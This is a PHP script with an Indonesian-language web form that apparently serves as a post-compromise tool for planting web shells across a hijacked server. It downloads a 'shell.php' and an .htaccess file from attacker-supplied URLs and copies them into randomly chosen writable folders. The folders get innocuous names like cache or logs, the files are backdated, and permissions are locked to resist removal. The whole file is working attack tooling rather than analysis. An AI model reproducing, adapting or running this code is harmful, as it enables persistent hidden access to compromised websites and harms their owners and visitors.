<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

define('SCRIPT_VERSION', '2025-07-08-v4');

$success = [];
$error = [];

function fetchFileFromUrl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
}

function generateRandomFolderName($base, $used = []) {
    $names = ['.tmp', 'cache', 'function', 'logs', 'sess', 'lib', 'assets', 'data'];
    shuffle($names);
    foreach ($names as $name) {
        $folder = $base . '/' . $name;
        if (!in_array($folder, $used) && !is_dir($folder)) {
            return $folder;
        }
    }
    return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
}

function findAllWritableFolders($dir, &$errorLog = []) {
    $results = [];
    $queue = [$dir];

    while (!empty($queue)) {
        $current = array_pop($queue);

        if (!is_readable($current)) {
            $owner = @posix_getpwuid(@fileowner($current));
            $ownerInfo = $owner ? ($owner['name'] ?? 'unknown') : 'unknown';
            $perms = @substr(sprintf('%o', @fileperms($current)), -4);
            $errorLog[] = "❌ Tidak bisa akses folder: $current (owner: $ownerInfo, perms: $perms)";
            continue;
        }

        $subdirs = @glob($current . '/*', GLOB_ONLYDIR);
        if ($subdirs === false) {
            $errorLog[] = "⚠️ Gagal membaca isi folder: $current";
            continue;
        }

        $results[] = $current;
        foreach ($subdirs as $sub) {
            $queue[] = $sub;
        }
    }

    return $results;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target = rtrim($_POST['target_path'] ?? '', '/');
    $phpUrl = $_POST['php_url'] ?? '';
    $htaccessUrl = $_POST['htaccess_url'] ?? '';
    $phpName = basename($_POST['php_name'] ?? 'shell.php');
    $limit = max(1, min(50, intval($_POST['folder_limit'] ?? 5)));
    $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;

    if (!is_dir($target)) {
        $error[] = "❌ Folder tidak valid: $target";
    } else {
        $phpContent = fetchFileFromUrl($phpUrl);
        $htaccessContent = fetchFileFromUrl($htaccessUrl);

        if (!$phpContent) $error[] = "❌ Gagal ambil file PHP dari URL.";
        if (!$htaccessContent) $error[] = "❌ Gagal ambil .htaccess dari URL.";

        if ($phpContent && $htaccessContent) {
            $allFolders = findAllWritableFolders($target, $error);
            $success[] = "📦 Semua folder ditemukan: " . count($allFolders);

            if (empty($allFolders)) {
                $error[] = "❌ Tidak ada folder yang bisa digunakan untuk deploy.";
            } else {
                shuffle($allFolders);
                $targets = array_slice($allFolders, 0, $limit);
                $usedFolders = [];

                foreach ($targets as $base) {
                    $newFolder = generateRandomFolderName($base, $usedFolders);
                    $usedFolders[] = $newFolder;

                    if (!mkdir($newFolder, 0755, true)) {
                        $error[] = "❌ Gagal buat folder: $newFolder";
                        continue;
                    }

                    $phpPath = $newFolder . '/' . $phpName;
                    $htPath  = $newFolder . '/.htaccess';

                    $ok1 = file_put_contents($phpPath, $phpContent);
                    $ok2 = file_put_contents($htPath, $htaccessContent);
                    // Set timestamp jika valid
                    if ($timestamp) {
                        if (file_exists($phpPath) && @touch($phpPath, $timestamp)) {
                            $success[] = "⏱️ Timestamp set: $phpPath";
                        } else {
                            $error[] = "❌ Gagal set timestamp PHP: $phpPath";
                        }
                    
                        if (file_exists($htPath) && @touch($htPath, $timestamp)) {
                            $success[] = "⏱️ Timestamp set: $htPath";
                        } else {
                            $error[] = "❌ Gagal set timestamp .htaccess: $htPath";
                        }
                    }

                    if ($ok1 !== false) {
                        chmod($phpPath, 0444);
                        $success[] = "✅ PHP: $phpPath (chmod 0444)";
                    } else {
                        $error[] = "❌ Gagal tulis PHP: $phpPath";
                    }

                    if ($ok2 !== false) {
                        chmod($htPath, 0444);
                        $success[] = "✅ .htaccess: $htPath (chmod 0444)";
                    } else {
                        $error[] = "❌ Gagal tulis .htaccess: $htPath";
                    }

                    if (chmod($newFolder, 0111)) {
                        $success[] = "🔒 Folder dikunci: $newFolder (chmod 0111)";
                    } else {
                        $error[] = "❌ Gagal chmod 0111: $newFolder";
                    }
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass Deploy ke Leaf Folder</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; background: #222; border: none; color: #0f0; }
        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
        .log { background: #222; padding: 10px; margin-top: 20px; border-radius: 5px; }
        .success { color: #0f0; }
        .error { color: #f33; }
    </style>
</head>
<body>
    <h2>🚀 Mass Deploy .php + .htaccess ke Leaf Folder</h2>
    <form method="POST">
        <label>📁 Target Path:</label>
        <input type="text" name="target_path" required placeholder="/var/www/html">

        <label>🌐 URL .htaccess:</label>
        <input type="text" name="htaccess_url" required placeholder="https://raw.githubusercontent.com/.../.htaccess">

        <label>🌐 URL PHP File:</label>
        <input type="text" name="php_url" required placeholder="https://raw.githubusercontent.com/.../shell.php">

        <label>📄 Nama File PHP:</label>
        <input type="text" name="php_name" value="shell.php">

        <label>🔢 Jumlah Folder Random (1-50):</label>
        <input type="number" name="folder_limit" min="1" max="50" value="5">

        <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
<input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">

        
        <button type="submit">🚀 Deploy Sekarang</button>
    </form>

    <p style="color:gray;font-size:0.9em;">Versi: <?= SCRIPT_VERSION ?></p>

    <?php if (!empty($success)): ?>
        <div class="log">
            <h3>✅ Success Log:</h3>
            <?php foreach ($success as $line): ?>
                <div class="success">✔ <?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>

    <?php if (!empty($error)): ?>
        <div class="log">
            <h3>❌ Error Log:</h3>
            <?php foreach ($error as $line): ?>
                <div class="error">✖ <?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>
</body>
</html>
